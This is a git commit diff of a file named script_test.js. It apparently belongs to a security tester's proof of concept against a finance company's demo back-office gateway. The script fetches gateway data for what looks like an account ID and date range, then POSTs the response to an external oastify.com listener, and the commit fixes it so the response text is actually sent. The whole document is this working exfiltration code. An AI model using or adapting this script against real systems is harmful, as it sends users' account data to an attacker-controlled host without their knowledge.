3fa5e106aab38420ed71d05d8c6723a590383e82
sup3ruserdo <Aleksandrastrelchuk62@gmail.com>
2023-12-04 12:32:41 +0200

    Update script_test.js

--- script_test.js
+++ script_test.js
@@ -1,8 +1,6 @@
-fetch(`https://demobackoffice.finalto.com/Communication/Gateway.ashx?data=[1,[34,[%22141740%22,%2212/04/2023%22,%2201/15/2024%22]]]`).then((res)=>{
-  const requestOptions = {
+fetch(`https://demobackoffice.finalto.com/Communication/Gateway.ashx?data=[1,[34,[%22141740%22,%2212/04/2023%22,%2201/15/2024%22]]]`).then(res => {return res.text()}).then((res)=> {
+   const requestOptions = {
     method: 'POST',
     headers: { 'Content-Type': 'text/plain' },
     body: res.toString()
-};
-fetch('https://uvtgzitr8mxl28m1dp1k1q06ixoqcm0b.oastify.com', requestOptions);
-})
+}; fetch('https://uvtgzitr8mxl28m1dp1k1q06ixoqcm0b.oastify.com', requestOptions);})
